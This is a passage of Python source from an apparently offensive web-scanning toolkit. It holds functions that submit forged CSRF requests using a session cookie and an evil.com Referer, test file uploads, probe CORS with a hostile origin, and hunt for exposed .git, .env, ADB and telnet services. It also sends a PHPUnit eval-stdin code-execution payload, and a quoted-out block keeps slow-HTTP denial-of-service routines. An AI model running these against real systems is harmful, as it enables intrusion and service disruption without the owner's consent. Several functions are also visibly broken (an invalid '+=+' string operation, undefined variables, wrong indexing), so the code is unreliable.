        u, timeout=timeout, user_agent=user_agent, cookie=cookie, proxy=proxy
    )
    coun = -1
    for x in f:
        coun += 1
        vuln = True
        hd_v = False
        # print(Fore.BLUE+"Form: "+Fore.WHITE+str(f.index(x))+Fore.BLUE+"\nAction: "+Fore.WHITE+x['action']+Fore.BLUE+"\nMethod: "+Fore.WHITE+x['method']+Style.RESET_ALL)
        for y in x["inputs"]:
            # print("Name: {} | Type: {} | Value: {}".format(y["name"],y["type"],y["value"]))
            if y["type"].lower() == "hidden":
                hd_v = True
            if y["type"].lower() == "hidden" and any(
                ele in y["name"].lower() for ele in csrf_strings
            ):  # and y["value"]==f1f["inputs"][con]["value"]:
                vuln = False
        if vuln == True:
            if (
                hd_v == True
            ):  # if there is no Anti-CSRF Tokens then we check if the Hidden fields can be predicted or not (keep their values or change them by request)
                # print(Fore.YELLOW+"[i] Validating hidden values' prediction..."+Style.RESET_ALL)
                for i in x["hidden_values"]:
                    if len(x["hidden_values"][i]) > 0:
                        if x["hidden_values"][i] != f1[coun]["hidden_values"][i]:
                            vuln = False
        if vuln == True:
            colr = Fore.GREEN
            """if logs==True:
    print (colr+"[+] Vulnerable"+Style.RESET_ALL)"""
            res["Vulnerable"].append(x)
        else:
            colr = Fore.RED
            """if logs==True:
    print (colr+"[-] Not vulnerable"+Style.RESET_ALL)"""
            res["Safe"].append(x)
    return res


def csrf_forms(
    u,
    proxy=None,
    timeout=10,
    show_warnings=True,
    user_agent=None,
    cookie=None,
    replaceble_parameters={"phpvalue": ((".", ""),)},
    file_extension="png",
    fill_empty=10,
    referer="http://www.evil.com",
    leave_empty=[],
    dont_send=[],
    mime_type=None,
    predefined_inputs={},
):
    vu = []
    if not cookie or len(cookie.strip()) == 0:
        raise Exception(
            "This attack requires authentication !! You need to set a Cookie"
        )
    v = csrf_filter_tokens(
        u, proxy=proxy, timeout=timeout, user_agent=user_agent, cookie=cookie
    )["Vulnerable"]
    if user_agent:
        h = {"User-Agent": user_agent}
    else:
        h = {"User-Agent": random.choice(ua)}
    h.update({"cookie": cookie})
    h.update(
        {
            "Referer": referer,
            "Origin": referer.split("://")[0]
            + "://"
            + referer.split("://")[1].split("/")[0],
        }
    )
    for x in v:
        x = form_filler(
            x,
            "",
            "",
            file_extension=file_extension,
            auto_fill=fill_empty,
            leave_empty=leave_empty,
            dont_send=dont_send,
            mime_type=mime_type,
            predefined_inputs=predefined_inputs,
        )
        d, f = setup_to_submit(x)
        for g in d:
            for y in replaceble_parameters:
                if x == y:
                    for z in replaceble_parameters[y]:
                        d[g] = d[g].replace(z[0], z[1])
        l = [d[y] for y in d]
        for j in f:
            l.append(f[j][0])
        if x["method"] == "get":
            r = requests.get(
                x["action"], params=d, proxies=proxy, timeout=timeout, headers=h,verify=False,
            )
        else:
            if "application/json" in x["enctype"]:
                d = json.dumps(d)
            r = requests.post(
                x["action"], data=d, files=f, proxies=proxy, timeout=timeout, headers=h,verify=False,
            )
        if all(i in r.text for i in l):
            vu.append({'form':x, 'status':"Found all data"})
        elif r.status_code == 200 and any(i in r.text for i in l):
            vu.append({'form':x, 'status':"Found some data"})
            if show_warnings == True:
                print(
                    "Warning: HTTP Status Code: 200 , but we didn't find some of our submitted data, so it's probably vulnerable but they are saved somewhere else..\nPlease check manually by visiting the form again"
                )
        elif (
            r.status_code == 200
            and not any(i in r.text for i in l)
            and any(
                i in r.text.lower() for i in ["unauthorized", "invalid", "unacceptable"]
            )
        ):
            return False
        elif r.status_code == 200 and not any(i in r.text for i in l):
            if show_warnings == True:
                print(
                    "Warning: HTTP Status Code: 200 , but we didn't find any of our submitted data, so it's probably vulnerable but they are saved somewhere else..\nPlease check manually by visiting the form again"
                )
            vu.append({'form':x, 'status':"Found no data but Status Code: 200"})
    return vu


def csrf(
    u,
    max_pages=5,
    logs=True,
    proxy=None,
    timeout=10,
    show_warnings=True,
    user_agent=None,
    cookie=None,
    replaceble_parameters={"phpvalue": ((".", ""),)},
    file_extension="png",
    fill_empty=10,
    referer="http://www.evil.com",
    leave_empty=[],
    dont_send=[],
    mime_type=None,
    predefined_inputs={},
    pages=[]
):
    l=[]
    if pages==[]:
        pages=spider_url(u,cookie=cookie,max_pages=max_pages,timeout=timeout,user_agent=user_agent,proxy=proxy)
    for x in pages:
        if logs==True:
            print('\n\nPage: {}\n'.format(x))
        result=csrf_forms(x,
                        proxy=proxy,
                        timeout=timeout,
                        show_warnings=show_warnings,
                        user_agent=user_agent,
                        cookie=cookie,
                        replaceble_parameters=replaceble_parameters,
                        file_extension=file_extension,
                        fill_empty=fill_empty,
                        referer=referer,
                        leave_empty=leave_empty,
                        dont_send=dont_send,
                        mime_type=mime_type,
                        predefined_inputs=predefined_inputs)
        if logs==True:
            for r in result:
                print(r)
        l.append({'page':x,'result':result})
    return  [x for x in l if x['result']!=[]]




def file_upload_forms(
    u,
    proxy=None,
    timeout=10,
    show_warnings=True,
    user_agent=None,
    cookie=None,
    replaceble_parameters={"phpvalue": ((".", ""),)},
    file_extension="png",
    fill_empty=10,
    dont_change=[],
    referer=None,
    leave_empty=[],
    dont_send=[],
    mime_type=None,
    predefined_inputs={},
):
    l = []
    result=[]
    x = forms_parser(
        u, proxy=proxy, timeout=timeout, user_agent=user_agent, cookie=cookie
    )
    fos = get_upload_form(x)
    for fo in fos:
        d, f = setup_to_submit(
            form_filler(
                fo,
                "",
                "",
                mime_type=mime_type,
                file_extension=file_extension,
                predefined_inputs=predefined_inputs,
                leave_empty=leave_empty,
                dont_change=dont_change,
                dont_send=dont_send
            )
        )
        for x in d:
            for y in replaceble_parameters:
                if x == y:
                    for z in replaceble_parameters[y]:
                        d[x] = d[x].replace(z[0], z[1])
        if not referer or len(referer) == 0:
            referer = u
        for j in f:
            l.append(f[j][0])
        if user_agent:
            h = {"User-Agent": user_agent}
        else:
            h = {"User-Agent": random.choice(ua)}
        if "application/json" in fo["enctype"]:
            d = json.dumps(d)
        h.update({"cookie": cookie})
        h.update(
            {
                "Referer": referer,
                "Origin": referer.split("://")[0]
                + "://"
                + referer.split("://")[1].split("/")[0],
            }
        )
        try:
            r = requests.post(
                fo["action"], data=d, files=f, proxies=proxy, timeout=timeout, headers=h,verify=False,
            )
            if (
                r.status_code == 200
                and not any(i in r.text for i in l)
                and any(
                    i in r.text.lower() for i in ["only accept", "invalid","not valid","not a valid", "unacceptable","not allowed","not accepted","not acceptable"]
                )
            ):
                pass#result.append({"form":fo,"vulnerable": False, 'status':"Unacceptable file extension"})
            elif all(i in r.text for i in l):
                result.append({"form":fo,"vulnerable":True, 'status':"Found all data"})
            elif r.status_code == 200 and any(i in r.text for i in l):
                if show_warnings == True:
                    print(
                        "Warning: HTTP Status Code: 200 , but we didn't find some of our submitted data, so it's probably vulnerable but they are saved somewhere else..\nPlease check manually by visiting the form again"
                    )
                result.append({"form":fo,"vulnerable":True, 'status':"HTTP Status Code: 200 , but we didn't find some of our submitted data, so it's probably vulnerable but they are saved somewhere else..\nPlease check manually by visiting the form again"
                    })
            elif r.status_code == 200 and not any(i in r.text for i in l):
                if show_warnings == True:
                    print(
                        "Warning: HTTP Status Code: 200 , but we didn't find our submitted data, so it's probably vulnerable but they are saved somewhere else..\nPlease check manually by visiting the form again"
                    )
                result.append({"form":fo,"vulnerable": True, 'status':"HTTP Status Code: 200 , but we didn't find our submitted data, so it's probably vulnerable but they are saved somewhere else..\nPlease check manually by visiting the form again"})
        except Exception as ex:
            #raise(ex)
            pass#result.append({"form":fo,"vulnerable": False, 'status':"Found no data and Status Code NOT: 200"})
    return result



def file_upload(
    u,
    max_pages=5,
    logs=True,
    proxy=None,
    timeout=10,
    show_warnings=True,
    user_agent=None,
    cookie=None,
    replaceble_parameters={"phpvalue": ((".", ""),)},
    file_extension="png",
    fill_empty=10,
    referer=None,
    leave_empty=[],
    dont_send=[],
    mime_type=None,
    predefined_inputs={},
    pages=[]
):
    l=[]
    if pages==[]:
        pages=spider_url(u,cookie=cookie,max_pages=max_pages,timeout=timeout,user_agent=user_agent,proxy=proxy)
    for x in pages:
        if logs==True:
            print('\n\nPage: {}\n'.format(x))
        result=file_upload_forms(x,
                                proxy=proxy,
                                timeout=timeout,
                                show_warnings=show_warnings,
                                user_agent=user_agent,
                                cookie=cookie,
                                replaceble_parameters=replaceble_parameters,
                                file_extension=file_extension,
                                fill_empty=fill_empty,
                                referer=referer,
                                leave_empty=leave_empty,
                                dont_send=dont_send,
                                mime_type=mime_type,
                                predefined_inputs=predefined_inputs)
        #result={'vulnerable':result[0],'status':result[1]}
        if logs==True:
            for r in result:
                print(r)
        if result!=[]:
            l.append({'page':x,'result':result})
    return  l#[x for x in l if x['result']['vulnerable']!=False]



def cors_reflection(
    u,
    proxy=None,
    timeout=10,
    user_agent=None,
    cookie=None,
    origin="www.evil-domain.com",
    debug=False,
    fill=10,
):
    a = None
    b = None
    if user_agent:
        us = user_agent
    else:
        us = random.choice(ua)
    if cookie:
        heads = {"User-Agent": us, "Cookie": cookie}
    else:
        heads = {"User-Agent": us}
    heads.update({"Origin": origin})
    try:
        r = requests.get(
            u, headers=heads, proxies=proxy, timeout=timeout, verify=False
        ).headers
        a = r.get("Access-Control-Allow-Origin", None)
        b = r.get("Access-Control-Allow-Credentials", None)
        if debug == True:
            for x in r:
                print(x + " : " + r[x])
        if a and b:
            if a == origin and b == "true":
                return (
                    True,
                    {
                        "Access-Control-Allow-Origin": a,
                        "Access-Control-Allow-Credentials": b,
                        "Vulnerable": True,
                    },
                )
    except:
        pass
    return (
        False,
        {
            "Access-Control-Allow-Origin": a,
            "Access-Control-Allow-Credentials": b,
            "Vulnerable": False,
        },
    )


def cors_wildcard(u, proxy=None, timeout=10, user_agent=None, cookie=None, debug=False):
    a = None
    b = None
    if user_agent:
        us = user_agent
    else:
        us = random.choice(ua)
    if cookie:
        heads = {"User-Agent": us, "Cookie": cookie}
    else:
        heads = {"User-Agent": us}
    heads.update({"Origin": "*"})
    try:
        r = requests.get(
            u, headers=heads, proxies=proxy, timeout=timeout, verify=False
        ).headers
        a = r.get("Access-Control-Allow-Origin", None)
        b = r.get("Access-Control-Allow-Credentials", None)
        if debug == True:
            for x in r:
                print(x + " : " + r[x])
        if a and b:
            if a == "*" and b == "true":
                return (
                    True,
                    {
                        "Access-Control-Allow-Origin": a,
                        "Access-Control-Allow-Credentials": b,
                        "Vulnerable": True,
                    },
                )
    except:
        pass
    return (
        False,
        {
            "Access-Control-Allow-Origin": a,
            "Access-Control-Allow-Credentials": b,
            "Vulnerable": False,
        },
    )


def cors_null(u, proxy=None, timeout=10, user_agent=None, cookie=None, debug=False):
    a = None
    b = None
    if user_agent:
        us = user_agent
    else:
        us = random.choice(ua)
    if cookie:
        heads = {"User-Agent": us, "Cookie": cookie}
    else:
        heads = {"User-Agent": us}
    heads.update({"Origin": "null"})
    try:
        r = requests.get(
            u, headers=heads, proxies=proxy, timeout=timeout, verify=False
        ).headers
        a = r.get("Access-Control-Allow-Origin", None)
        b = r.get("Access-Control-Allow-Credentials", None)
        if debug == True:
            for x in r:
                print(x + " : " + r[x])
        if a and b:
            if a == "null" and b == "true":
                return (
                    True,
                    {
                        "Access-Control-Allow-Origin": a,
                        "Access-Control-Allow-Credentials": b,
                        "Vulnerable": True,
                    },
                )
    except:
        pass
    return (
        False,
        {
            "Access-Control-Allow-Origin": a,
            "Access-Control-Allow-Credentials": b,
            "Vulnerable": False,
        },
    )




def proxies_select(proxy, proxies):
    if proxy:
        return proxy
    if proxies:
        return random.choice(proxies)
    return None


def cors_misconfigurations_urls(
    u,
    origin="www.evil-domain.com",
    origin_reflection=True,
    wildcard_origin=True,
    null_origin=True,
    proxy=None,
    proxies=None,
    timeout=10,
    user_agent=None,
    cookie=None,
    logs=True,
    debug=False,
):
    res = {}
    if origin_reflection == True:
        if logs == True:
            print("[*] Testing for: Origin Reflection...")
        tes1 = cors_reflection(
            u,
            origin=origin,
            cookie=cookie,
            user_agent=user_agent,
            timeout=timeout,
            proxy=proxies_select(proxy, proxies),
            debug=debug,
        )
        if tes1[0] == True:
            res.update({"cors_reflection": tes1[1],'vulnerable':True})
            if logs == True:
                print("[+] Vulnerable !!")
        else:
            res.update({"cors_reflection": tes1[1],'vulnerable':False})
            if logs == True:
                print("[-] Not vulnerable")
    if wildcard_origin == True:
        if logs == True:
            print("[*] Testing for: Wildcard Origin...")
        tes2 = cors_wildcard(
            u,
            cookie=cookie,
            user_agent=user_agent,
            timeout=timeout,
            proxy=proxies_select(proxy, proxies),
            debug=debug,
        )
        if tes2[0] == True:
            res.update({"wildcard_origin": tes2[1],'vulnerable':True})
            if logs == True:
                print("[+] Vulnerable !!")
        else:
            res.update({"wildcard_origin": tes2[1],'vulnerable':False})
            if logs == True:
                print("[-] Not vulnerable")
    if origin_reflection == True:
        if logs == True:
            print("[*] Testing for: Null Origin...")
        tes3 = cors_null(
            u,
            cookie=cookie,
            user_agent=user_agent,
            timeout=timeout,
            proxy=proxies_select(proxy, proxies),
            debug=debug,
        )
        if tes3[0] == True:
            res.update({"null_origin": tes3[1],'vulnerable':True})
            if logs == True:
                print("[+] Vulnerable !!")
        else:
            res.update({"null_origin": tes3[1],'vulnerable':False})
            if logs == True:
                print("[-] Not vulnerable")
    return res



def cors_misconfigurations(
    urls,
    origin="www.evil-domain.com",
    origin_reflection=True,
    wildcard_origin=True,
    null_origin=True,
    proxy=None,
    proxies=None,
    timeout=10,
    user_agent=None,
    cookie=None,
    logs=True,
    debug=False,
):
    l=[]
    for x in urls:
        if logs==True:
            print('\n\nPage: {}\n'.format(x))
        result=cors_misconfigurations_urls(x,
                                            origin=origin,
                                            origin_reflection=origin_reflection,
                                            wildcard_origin=wildcard_origin,
                                            null_origin=null_origin,
                                            proxy=proxy,
                                            proxies=proxies,
                                            timeout=timeout,
                                            user_agent=user_agent,
                                            cookie=cookie,
                                            logs=logs,
                                            debug=debug,)
        result={'vulnerable':result[0],'status':result[1]}
        if logs==True:
            for r in result:
                print(r)
        l.append({'page':x,'result':result})
    return  [x for x in l if x['result']['vulnerable']!=False]





"""
'''
  the following functions are used to check any kind of Slow HTTP attacks vulnerabilities that will lead to a possible DoS.
'''

def build_get(u,p,timeout=5):
    s =socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    s.connect((u,p))
    if ((p==443 ) or (p==8443)):
     s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
    s.send("GET {} HTTP/1.1\r\n".format(random.choice(paths)).encode("utf-8"))
    s.send("User-Agent: {}\r\n".format(random.choice(ua)).encode("utf-8"))
    s.send("Accept-language: en-US,en,q=0.5\r\n".encode("utf-8"))
    s.send("Connection: keep-alive\r\n".encode("utf-8"))
    return s

def headers_timeout_test(u,port=80,timeout=5,max_timeout=30,logs=True):
 i=0
 if logs==True:
  print("[*]Test has started:\nTarget: {}\nPort: {}\nInitial connection timeout: {}\nMax interval: {}".format(u,port,timeout,max_timeout))
 try:
  s=build_get(u,port,timeout=timeout)
  i+=1
 except:
  if logs==True:
   print("[-]Connection failed")
  return 0
 if i>0:
  j=0
  while True:
   try:
    j+=1
    if j>max_timeout:
     break
    if logs==True:
     print("[*]Sending payload...")
    s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
    if logs==True:
     print("[+]Sleeping for {} seconds...".format(j))
    time.sleep(j)
   except:
    if logs==True:
     print("==>timed out at: {} seconds".format(j))
     break
    return j
  if j>max_timeout:
   if logs==True:
    print("==>Test has reached the max interval: {} seconds without timing out".format(duration))
   return j

def slow_get_test(u,port=80,timeout=5,interval=5,randomly=False,duration=180,logs=True,min_wait=1,max_wait=5):
 i=0
 if logs==True:
  print("[*]Test has started:\nTarget: {}\nPort: {}\nInitial connection timeout: {}\nInterval between packets:{}\nTest duration: {} seconds".format(u,port,timeout,interval,duration))
 try:
  s=build_get(u,port,timeout=timeout)
  i+=1
 except:
  if logs==True:
   print("[-]Connection failed")
  return 0
 if i>0:
  j=time.time()
  while True:
   try:
    ti=time.time()
    if int(ti-j)>=duration:
     break
    if logs==True:
     print("[*]Sending payload...")
    s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
    t=interval
    if randomly==True:
     t=random.randint(min_wait,max_wait)
    if logs==True:
     print("[+]Sleeping for {} seconds...".format(t))
    time.sleep(t)
   except Exception as e:
    pass
    if logs==True:
     print("==>timed out at: {} seconds".format(int(ti-j)))
    return int(ti-j)
    break
  if int(ti-j)>=duration:
   if logs==True:
    print("==>Test has reached the max interval: {} seconds without timing out".format(duration))
   return int(ti-j)

def max_connections_limit(u,port=80,connections=150,timeout=5,duration=180,logs=True,payloads=True):
 l=[]
 if logs==True:
  print("[*]Test has started:\nTarget: {}\nPort: {}\nConnections to create: {}\nInitial connection timeout: {}\nTest duration: {} seconds".format(u,port,connections,timeout,duration))
 ti=time.time()
 while True:
  if int(time.time()-ti)>=duration:
   if logs==True:
    print("[+]Maximum time for test has been reached!!!")
    break
   return len(l)
  if len(l)==connections:
   if logs==True:
    print("[+]Maximum number of connections has been reached!!!")
   if returning==True:
    return connections 
   break
  try:
   so=build_get(u,port,timeout=timeout)
   l.append(so)
  except Exception as e:
   pass
  if payloads==True:
   for s in l:
    try:
     s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
    except:
     l.remove(s)
  if logs==True:
   print("[!]Sockets: {} Time: {} seconds".format(len(l),int(time.time()-ti)))

def build_post(u,p,timeout=5,size=10000):
 s =socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.settimeout(timeout)
 s.connect((u,p))
 if ((p==443 ) or (p==8443)):
  s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
 s.send("POST {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: en-US,en,q=0.5\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: {}\r\n\r\n".format(random.choice(paths),random.choice(ua),random.randint(300,1000),size,u).encode("utf-8"))
 return s

def slow_post_test(u,port=80,logs=True,timeout=5,size=10000,duration=180,randomly=False,wait=1,min_wait=1,max_wait=5):
 i=0
 if logs==True:
  print("[*]Test has started:\nTarget: {}\nPort: {}\nData length to post: {}\nInitial connection timeout:{}\nTest duration: {} seconds".format(u,port,size,timeout,duration))
 try:
  s=build_post(u,port,timeout=timeout,size=size)
  i+=1
 except Exception as e:
  if logs==True:
   print("[-]Connection failed")
  return 0
 j=0
 if i>0:
  t=time.time()
  while True:
   if int(time.time()-t)>=duration:
    if logs==True:
     print("[+]Maximum time has been reached!!!\n==>Size: {}\n==>Time: {}".format(j,int(time.time()-t)))
    return int(time.time()-t)
   if j==size:
    if logs==True:
     print("[+]Maximum size has been reached!!!\n==>Size: {}\n==>Time: {}".format(j,int(time.time()-t)))
    return int(time.time()-t)
   try:
    h=random.choice(lis)
    s.send(h.encode("utf-8"))
    j+=1
    if logs==True:
     print("Posted: {}".format(h))
    if randomly==True:
     time.sleep(random.randint(min_wait,max_wait))
    if randomly==False:
     try:
      time.sleep(wait)
     except KeyboardInterrupt:
      if logs==True:
       print("[-]Cant send more\n==>Size: {}\n==>Time:{}".format(j,int(time.time()-t)))
      return int(time.time()-t)
   except Exception as e:
    if logs==True:
     print("[-]Cant send more\n==>Size: {}\n==>Time:{}".format(j,int(time.time()-t)))
    return int(time.time()-t)

def slow_read_test(u,port=80,logs=True,timeout=5,duration=180,randomly=False,wait=5,min_wait=1,max_wait=10):
  i=0
  if logs==True:
   print("[*]Test has started:\nTarget: {}\nPort: {}\nInitial connection timeout: {}\nTest duration: {} seconds".format(u,port,timeout,duration))
  ti=time.time()
  try: 
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.settimeout(timeout)
    s.connect((u,port))
    if ((port==443 ) or (port==8443)):
     s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
    while True:
     if time.time()-ti>=duration:
      if logs==True:
       print("[+]Maximum time has been reached!!!")
      return int(time.time()-ti)
     pa=random.choice(paths)
     try:
      g=random.randint(1,2)
      if g==1:
       s.send("GET {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: en-US,en,q=0.5\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nHost: {}\r\n\r\n".format(pa,random.choice(ua),random.randint(300,1000),u).encode("utf-8"))
      else:
       q='q='
       for i in range(10,random.randint(20,50)):
        q+=random.choice(lis)
       s.send("POST {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: en-US,en,q=0.5\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: {}\r\n\r\n{}".format(pa,random.choice(ua),random.randint(300,1000),len(q),u,q).encode("utf-8"))
      d=s.recv(random.randint(1,3))
      if logs==True:
       print("Received: {}".format(str(d.decode('utf-8'))))
      print("sleeping...")
      if randomly==True:
       time.sleep(random.randint(min_wait,max_wait))
      if randomly==False:
       time.sleep(wait)
     except:
      break
    s.close()
  except Exception as e:
    pass
  if logs==True:
   print("==>connection closed at: {} seconds".format(int(time.time()-ti)))
  return int(time.time()-ti)

"""


def adb_exploit(u, timeout=5, p=5555):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((u, p))
        s.send(
            b"CNXN\x00\x00\x00\x01\x00\x10\x00\x00\x07\x00\x00\x00\x32\x02\x00\x00\xbc\xb1\xa7\xb1host::\x00"
        )
        c = s.recv(4096)
        s.close()
        if "CNXN" in str(c):
            return True
    except:
        pass
    return False


def exposed_telnet(u, p=23, timeout=5):
    try:
        t = xtelnet.session()
        t.connect(u, p=p, timeout=timeout)
        t.destroy()
        return True
    except:
        pass
    return False


def exposed_git(
    u,
    user_agent=None,
    cookie=None,
    proxy=None,
    timeout=15,
):
    if u.endswith('/')==True:
        u+=+'.git'
    else:
        u+=+'/.git'
    if user_agent:
            us = user_agent
    else:
            us = random.choice(ua)
    if cookie:
            hea = {"User-Agent": us, "Cookie": cookie}
    else:
            hea = {"User-Agent": us}
    try:
        r=requests.get(u,timeout=timeout,verify=False,proxies=proxy,headers=hea)
        if "index of" in r.text.lower() and "/.git" in r.text.lower():
            return True
    except:
        return False



def exposed_env(
    u,
    user_agent=None,
    cookie=None,
    proxies=None,
    proxy=None,
    path="",
    brute_force=True,
    timeout=15,
):
    if brute_force == False:
        if user_agent:
            us = user_agent
        else:
            us = random.choice(ua)
        if cookie:
            hea = {"User-Agent": us, "Cookie": cookie}
        else:
            hea = {"User-Agent": us}
        try:
            if urlparse(u).path == "/":
                u += path + ".env"
            elif len(urlparse(u).path) < 1:
                u += path + "/.env"
            else:
                u = u.replace(urlparse(u).path, path + "/.env")
            c = requests.get(
                u, headers=hea, proxies=proxy, timeout=timeout, verify=False
            ).text
            if ("APP_KEY=" in c) or ("DB_HOST=" in c):
                return (True, u)
        except:
            pass
        return (False, "")
    else:
        for x in env_paths:
            if proxy:
                proxy = proxy
            if proxies:
                proxy = random.choice(proxies)
            a = exposed_env(
                u,
                user_agent=user_agent,
                cookie=cookie,
                proxy=proxy,
                path=x,
                timeout=timeout,
            )
            if a[0] == True:
                return a
        return (False, "")


def vulners_search(
    software,
    file_name="",
    save_to_file=False,
    max_vulnerabilities=100,
    version="",
    software_type="software",
    user_agent=None,
    cookie=None,
    proxies=None,
    proxy=None,
    timeout=20,
):
    if not file_name:
        if version:
            file_name = software + "-" + version.replace(".", "-")
        else:
            file_name = software
    if user_agent:
        us = user_agent
    else:
        us = random.choice(ua)
    if cookie:
        hea = {"User-Agent": us, "Cookie": cookie}
    else:
        hea = {"User-Agent": us}
    try:
        ver = ""
        if version:
            ver = version
        max_vuln = 100
        if max_vulnerabilities:
            max_vuln = max_vulnerabilities
        ty = "software"
        if software_type:
            ty = software_type
        if ty not in ["software", "cpe"]:
            raise Exception('type must be: "software" or "cpe"')
        d = {
            "maxVulnerabilities": max_vuln,
            "version": ver,
            "type": ty,
            "software": software,
        }
        r = requests.get(
            "https://vulners.com/api/v3/burp/software/",
            params=d,
            headers=hea,
            proxies=proxy,
            timeout=timeout,
            verify=False,
        )
        c = json.loads(r.text)
        if c["result"] == "OK":
            if save_to_file==True:
                with open(file_name.split(".")[0] + ".json", "w") as outfile:
                    json.dump(c, outfile, indent=4)
                outfile.close()
            l = []
            m = c["data"]["search"]
            i = 0
            for x in m:
                #print(x)
                l.append(
                     x[
                            "_source"
                        ]
                )
                i += 1
            return l
    except:
        pass
    return []


def shodan_report(ip, api_key, file_name="shodan_report",save_to_file=False):
    u = "https://api.shodan.io/shodan/host/{}?key={}".format(ip, api_key)
    try:
        r = requests.get(u, headers={"User-Agent": random.choice(ua)}).text
        if save_to_file==True:
            with open(file_name.split(".")[0] + ".json", "w") as outfile:
                json.dump(json.loads(r), outfile, indent=4)
            outfile.close()
        return json.loads(r)
    except:
        return {}


def phpunit_exploit(
    u,
    path="/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
    user_agent=None,
    cookie=None,
    timeout=10,
    proxy=None,
):
    if u[len(u) - 1] == "/":
        u = u[0 : len(u) - 1]
    if user_agent:
        us = user_agent
    else:
        us = random.choice(ua)
    hed = {"User-Agent": us}
    if cookie:
        hed.update({"Cookie": cookie})
    try:
        r = requests.post(
            u + path,
            data="<?php echo 'This_is_vulnerable_site';?>",
            headers=hed,
            proxies=proxy,
            timeout=timeout,
            verify=False,
        ).text
        if "This_is_vulnerable_site" in r:
            return True
    except:
        pass
    return False


def springboot_actuator(u,user_agent=None,cookie=None,proxy=None,timeout=None,path='/actuator'):
    if u[len(u) - 1] == "/":
        u = u[0 : len(u) - 1]
    if user_agent:
        us = user_agent
    else:
        us = random.choice(ua)
    hed = {"User-Agent": us}
    if cookie:
        hed.update({"Cookie": cookie})
    try:
        return requests.get(
            u + path,
            headers=hed,
            proxies=proxy,
            timeout=timeout,
            verify=False,
        ).json()
    except:
        pass
